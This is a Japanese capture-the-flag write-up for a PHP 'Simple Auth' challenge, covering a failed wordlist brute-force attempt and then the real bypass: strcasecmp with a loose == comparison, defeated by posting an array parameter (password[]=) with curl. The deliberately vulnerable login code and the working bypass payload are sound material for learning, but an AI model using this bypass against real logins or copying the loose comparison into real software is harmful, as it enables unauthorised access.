自力解答ならず。  

### 間違い

```php
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

脆弱性はなさそう。仕方ないから総当たりでパスワードを当てにいくことにする。  

``John the Ripper``の開発元が公開しているありがちなパスワードリストをダウンロード。  

```bash
$ wget https://download.openwall.net/pub/wordlists/passwords/password.gz
$ gzip -d password.gz
```

パスワードを1つ1つ手打ちするのはだるいのでPythonにやらせる。  
準備として、PythonのHTTPライブラリ``requests``とHTMLパーサライブラリ``BeautifulSoup``をインストール。  

```bash
$ pip install requests BeautifulSoup4
```

実行。``strcasecmp()``は大文字小文字を区別しないからどれかはヒットするやろ。  

```bash
$ python3 crack.py password
...
failed...: FLAG_nite
failed...: FLAG_notused
failed...: FLAG_sss
YOU ARE A LOSER.
```

はい。  

### 正解

``strcasecmp($_POST['password'], $password) == 0``に脆弱性がある。  
``strcasecmp()``と``strcmp()``は厳密な型チェックをしないため、引数に配列を渡せる。返り値は``NULL``。また、``===``ではなく``==``で比較しているため、ここではfalsyな値（``NULL``, ``false``, ``0``）はすべて同一扱いされる。  

```bash
# https://www.php.net/manual/ja/function.strcmp.php の User Contributed Notes より引用
If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.

strcmp("5", 5) => 0
strcmp("15", 0xf) => 0
strcmp(61529519452809720693702583126814, 61529519452809720000000000000000) => 0
strcmp(NULL, false) => 0
strcmp(NULL, "") => 0
strcmp(NULL, 0) => -1
strcmp(false, -1) => -2
strcmp("15", NULL) => 2
strcmp(NULL, "foo") => -3
strcmp("foo", NULL) => 3
strcmp("foo", false) => 3
strcmp("foo", 0) => 1
strcmp("foo", 5) => 1
strcmp("foo", array()) => NULL + PHP Warning # おい
strcmp("foo", new stdClass) => NULL + PHP Warning
strcmp(function(){}, "") => NULL + PHP Warning
```

具体的なクラック方法は、以下のようにしてパラメータを無理やり配列扱いさせる。値はなんでもいい。  

```bash
curl -X POST -d 'password[]=' https://ctfq.u1tramarine.blue/q32/auth.php
```

### 参考

- [strcasecmp | PHP マニュアル](https://www.php.net/manual/ja/function.strcasecmp.php)
- [スクレイピング・ハッキング・ラボ Pythonで自動化する未来型生活](https://nextpublishing.jp/book/12190.html)
- [クイックスタート | Requests](https://requests-docs-ja.readthedocs.io/en/latest/user/quickstart/)
- [Kali LinuxでJohn The Ripper,hydraによるパスワード解析 | Qiita](https://qiita.com/y-araki-qiita/items/cda417e49108eee1fb7b)
